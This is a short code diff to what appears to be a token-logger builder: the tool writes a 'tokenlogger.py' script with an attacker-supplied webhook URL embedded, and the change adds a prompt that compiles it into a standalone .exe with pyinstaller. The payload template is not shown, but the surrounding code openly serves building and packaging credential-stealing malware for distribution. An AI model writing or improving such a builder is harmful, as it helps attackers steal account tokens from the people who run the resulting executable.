@@ -81,4 +81,12 @@ class Create:
             f.write(FILE_CONTENT.replace("WEBHOOK_URL", f"'{webhook_url}'"))
             print(Fore.GREEN + "[*] Successfully created tokenlogger.py")
             f.close()
-            print(Fore.GREEN + "[*] To make it as .exe file, run the following command: pyinstaller --onefile tokenlogger.py")
+            print(Fore.GREEN + "[*] To make it as .exe file, run the following command: pyinstaller --onefile tokenlogger.py OR do it now? (y/n)")
+            choice = input("[*] > ")
+            if choice == "y":
+                try:
+                    os.system("pyinstaller --onefile tokenlogger/tokenlogger.py")
+                    print(Fore.GREEN + "[*] Successfully created tokenlogger.exe")
+                except Exception as e:
+                    print(Fore.RED + "[*] Failed to create tokenlogger.exe")
+                    print(Fore.RED + f"[*] Error: {e}")
